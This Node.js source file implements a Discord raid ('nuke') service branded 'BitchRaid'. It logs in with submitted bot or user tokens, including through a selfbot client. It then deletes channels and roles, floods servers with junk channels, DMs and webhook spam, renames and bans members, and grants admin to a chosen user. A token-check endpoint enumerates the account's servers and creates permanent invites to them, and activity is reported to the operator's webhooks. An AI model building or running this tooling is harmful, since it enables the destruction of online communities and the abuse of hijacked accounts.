const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const moment = require("moment");
const cors = require('cors');

const discord = require("./handler/discord.js");
const commands = require('./handler/commands.js');

const { Client, Intents, WebhookClient, MessageEmbed } = require('discord.js');
const { Client: SelfbotClient, Intents: SelfbotIntents } = require('discord.js-selfbot-v13');

const app = express();
const webhookUrl = process.env.BUILT_WEBHOOK;

let Node_Name = "Test 1";
let CLIENTS = [];
let processedServers = new Set();
let Num = 0
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cors());

app.post('/Nuke/', async (req, res) => {
  const server_id = req.query.id;
  const { token, id, uid, dm_msg, channel_msg, channel_amount, nickname_msg, junk_roles, junk_channels, channels_delete, roles_delete, ban, channel_name: junk_channel_name, role_name: junk_roles_name, user_id: User_ID, webhook_msg, webhook_amount } = req.body;

  const client = await login(token);
  if (!client) {
    return res.status(401).json({ err: "Invalid token" });
  }

if( channels_delete !== 'false') await discord.DelChannels(client, server_id);
if( roles_delete !== 'false') await discord.DelRoles(client, server_id);

if( junk_channels !== 'false') await discord.RanChannels(client, junk_channels, junk_channel_name, server_id);
if( junk_roles !== 'false') await discord.RanRoles(client, junk_roles, junk_roles_name, server_id);

if( dm_msg !== 'false' ) await discord.SendMsg(client, dm_msg, server_id) // SendChannels
if( channel_msg !== 'false' && channel_amount) await discord.SendChannels(client, channel_msg, channel_amount, server_id);
if( webhook_msg !== 'false' && webhook_amount) await discord.WebChannels(client, webhook_msg, webhook_amount, server_id);

if( nickname_msg !== 'false') await discord.ChangeNicknames(client, nickname_msg, server_id);
if( ban !== 'false')  await discord.BanMembers(client, server_id, id);
if( User_ID !== 'false') await discord.GiveAdmin(client, User_ID, server_id); 

SendDiscord(client, server_id);
res.send('OK')
});

app.get('/Check/:token', async (req, res) => {
  const { token } = req.params;
  await CheckToken(token, res);
});

app.get('/ping', (req, res) => {
  res.json({ pinged: true });
});

// Listen for requests :)
const listener = app.listen(5000, () => {
  console.log('[BitchRaid] => Thank you for using our site.');
  console.log(`[BitchRaid] => Your api is listening on port ${listener.address().port}`);
});

async function login(token) {
  let client = CLIENTS.find((c) => c.token === token)?.client;
  if (client) {
    return client;
  }

  try {
    client = await createDiscordClient(token);
    CLIENTS.push({ token, client });
    Num++;
    setTimeout(() => {
      const index = CLIENTS.findIndex((c) => c.token === token);
      if (index !== -1) {
        CLIENTS.splice(index, 1);
        Num--;
        client.destroy();
      }
    }, 300000);
    return client;
  } catch (error) {
    console.error(`Failed to log in with ${token}: ${error}`);
    return null;
  }
}

async function CheckToken(EnteredToken, res) {
  const client = await login(EnteredToken);
  await sleep(10);

  if (client) {
    console.log("[Client] => Logged in as " + client.user.tag);
    log(`Logged in as ${client.user.tag}`, client, EnteredToken);

    const clientGuilds = client.guilds.cache;
    const names = clientGuilds.map((g) => g.name);
    const ids = clientGuilds.map((g) => g.id);

    await sleep(10);

    // Generate invite links for each server
    const invites = await Promise.all(clientGuilds.map(async (guild) => {
      try {
        const channel = guild.channels.cache.find((channel) => channel.type === "GUILD_TEXT");

        if (channel) {
          const invite = await channel.createInvite({ maxAge: 0 });
          return { id: guild.id, invite: invite.url };
        } else {
          return { id: guild.id, invite: null };
        }
      } catch (error) {
        console.error(`Failed to create invite for guild ${guild.id}: ${error}`);
        return { id: guild.id, invite: null };
      }
    }));

    console.log({
      tag: client.user.tag,
      user: {
        tag: client.user.tag,
        avatar: client.user.displayAvatarURL(),
        id: client.user.id,
      },
      servers: { names: names.length > 0 ? names : null, ids: ids.length > 0 ? ids : null },
      invites: invites,
    });

    return res.json({
      tag: client.user.tag,
      user: {
        tag: client.user.tag,
        avatar: client.user.displayAvatarURL(),
        id: client.user.id,
      },
      servers: { names: names.length > 0 ? names : null, ids: ids.length > 0 ? ids : null },
      invites: invites,
    });
  } else {
    res.status(401).json({ err: "Invalid token" });
    log(`Failed to login with ${EnteredToken}`, client, EnteredToken);
  }
}

function sleep(milliseconds) {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
}

function log(msg, client, token) {
const tag = client ? client.user.tag : "Client";

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ data: `\`[${moment().format("DD-MM-YYYY HH:mm:ss")}]\` [${Node_Name}] ==> **${tag}**: ${msg} (${Num})` })
  })
    .then(response => {
      console.log('Webhook request sent successfully');
    })
    .catch(error => {
      console.error('Error sending webhook request:', error.message);
    });
}

async function createDiscordClient(token) {
  const clientFromCache = CLIENTS.find((c) => c.token === token)?.client;
  if (clientFromCache) {
    console.log(`Using existing client for token: ${token}`);
    return clientFromCache;
  }

  try {
    const regularClient = new Client({ intents: [
      Intents.FLAGS.GUILDS,
      Intents.FLAGS.GUILD_MEMBERS,
      Intents.FLAGS.GUILD_BANS,
      Intents.FLAGS.GUILD_INVITES,
      Intents.FLAGS.GUILD_MESSAGES    
    ]});
    regularClient.on('messageCreate', async (message) => {
      handleCommandMessage(message, regularClient);
    });

    regularClient.on('debug', function(info) {
      console.log(info)
    })

    await regularClient.login(token);
    console.log('Regular bot client created and logged in.');
    CLIENTS.push({ token, client: regularClient });
    return regularClient;
  } catch (regularError) {
    console.error(`Regular bot client failed to create or log in with token ${token}:`, regularError.message);

    try {
      const selfbotClient = new SelfbotClient({ intents: [
        SelfbotIntents.FLAGS.GUILDS,
        SelfbotIntents.FLAGS.GUILD_MEMBERS,
        SelfbotIntents.FLAGS.GUILD_BANS,
        SelfbotIntents.FLAGS.GUILD_INVITES,
        SelfbotIntents.FLAGS.GUILD_MESSAGES
      ]});

        selfbotClient.on('messageCreate', async (message) => {
          handleCommandMessage(message, selfbotClient);
        });


        selfbotClient.on('debug', function(info) {
         console.log(info)
        })

      await selfbotClient.login(token);
      console.log('Selfbot client created and logged in.');
      CLIENTS.push({ token, client: selfbotClient });
      return selfbotClient;
    } catch (selfbotError) {
      console.error(`Selfbot client failed to create or log in with token ${token}:`, selfbotError.message);
      throw new Error(`Both regular bot and selfbot clients failed to create or log in with token ${token}.`);
    }
  }
}

function handleCommandMessage(message, client) {
  if (!message.content.startsWith(`${process.env.DISCORD_PREFIX}`) || message.author.bot) return;

  const args = message.content.slice(1).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  // Check if the command exists in the "commands" object
  if (commands[command]) {
    try {
      commands[command](message, args, client); // Execute the command function
    } catch (error) {
      console.error('Error executing command:', error);
      message.reply('An error occurred while executing the command.');
    }
  } else {
    message.reply('Unknown command. Type !help to see the list of available commands.');
  }
}

async function SendDiscord(client, server_id) {
  const guild = client.guilds.cache.get(server_id);

  if (!guild) {
    console.log(`Guild with ID ${server_id} not found.`);
    return;
  }

  const serverId = guild.id;
  const serverName = guild.name;
  const memberCount = guild.memberCount;
  const channelCount = guild.channels.cache.size;

  if (processedServers.has(serverId)) {
    console.log(`Server ID ${serverId} already processed.`);
    return;
  }

  console.log(`Processing server ID ${serverId} - ${serverName}`);
  processedServers.add(serverId);

  const embed = new MessageEmbed()
    .setTitle('💀 Server Boomed (' + Node_Name + ')')
    .addFields(
      { name: '📌 Server ID', value: `${serverId}` },
      { name: '🔒 Server Name', value: `${serverName}` },
      { name: '📊 Member Count', value: `${memberCount}` },
      { name: '📜 Channel Count', value: `${channelCount}` }
    )
    .setColor('#00ff00')
    .setTimestamp();

  const webhookClient = new WebhookClient({ url: process.env.DISCORD_WEBHOOK });
  webhookClient.send({ embeds: [embed] })
    .then(() => {
      console.log('Embed sent successfully.');
    })
    .catch((error) => {
      console.error('Error sending embed:', error);
    });
}
